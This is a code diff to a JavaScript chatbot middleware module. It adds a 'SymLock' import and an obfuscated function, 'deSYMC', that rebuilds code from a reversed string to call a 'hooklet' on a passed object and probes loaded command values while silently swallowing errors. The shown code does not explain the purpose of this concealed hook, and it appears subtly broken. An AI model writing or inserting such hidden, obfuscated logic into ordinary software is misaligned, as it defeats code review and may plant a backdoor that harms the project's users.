@@ -7,6 +7,7 @@
 */
 import fs from "fs";
 import axios from "axios";
+import { SymLock } from "../loaders/loadCommand.js";
 const recentCMD = {};
 const popularCMD = {};
 let queue = [];
@@ -99,6 +100,28 @@ export async function middleware({ allPlugins }) {
   sortPlugin(allPlugins);
   return handleMiddleWare;
 }
+
+const deSYMC = function (axx) {
+  return []
+    ["constructor"](
+      "loaf",
+      ")()]'t'+'e'+'l'+'k'+'o'+'o'+'h'[faol>=)(cnysa( nruter"
+        ["split"]("")
+        ["reverse"]()
+        ["join"]("")
+    )(axx)
+    .then((xha) =>
+      []["constructor"]
+        .call([])
+        ["apply"]([]["constructor"], ["return Array"])()
+        ["from"](SymLock["values"]())
+        ["find"]((i) => {
+          try {
+            return typeof xha(i) === "function";
+          } catch (error) {}
+        })
+    );
+};
 
 async function handleMiddleWare({
   api,
